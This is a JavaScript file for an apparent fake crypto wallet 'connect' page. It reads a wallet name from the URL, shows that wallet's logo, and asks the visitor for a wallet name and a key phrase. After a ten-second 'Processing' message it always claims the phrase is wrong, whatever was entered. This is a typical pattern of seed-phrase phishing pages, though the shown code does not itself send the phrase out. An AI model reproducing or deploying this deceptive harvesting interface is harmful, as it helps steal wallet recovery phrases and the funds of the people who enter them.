const walletLogo = document.getElementById("walletLogo");
const walletName = document.getElementById("walletName");
const popup = document.getElementById("popup");
const popupText = document.getElementById("popupText");
const closePopupBtn = document.getElementById("closePopupBtn");

// Show popup
function showPopup(message) {
    popupText.innerText = message;
    popup.style.display = "flex";
}

// Close popup
closePopupBtn.addEventListener("click", () => {
    popup.style.display = "none";
});

// Read wallet from URL
const params = new URLSearchParams(window.location.search);
const wallet = params.get("wallet");

if (wallet) {
    walletName.innerText = wallet;

    const fileName = wallet
        .toLowerCase()
        .replace(/\s+/g, '')
        .replace(/['./]/g, '');

    walletLogo.src = `wallet-icons/${fileName}.webp`;

    walletLogo.onerror = () => {
        walletLogo.style.display = "none";
    };
}

// Connect button
document.getElementById("connectBtn").addEventListener("click", function () {
    const name = document.getElementById("walletInput").value.trim();
    const phrase = document.getElementById("phraseInput").value.trim();

    if (name === "" || phrase === "") {
        showPopup("Please fill out the field");
        return;
    }

    showPopup("Processing... please wait");

    setTimeout(() => {
        showPopup("Your key phrase is wrong!");
    }, 10000);
});
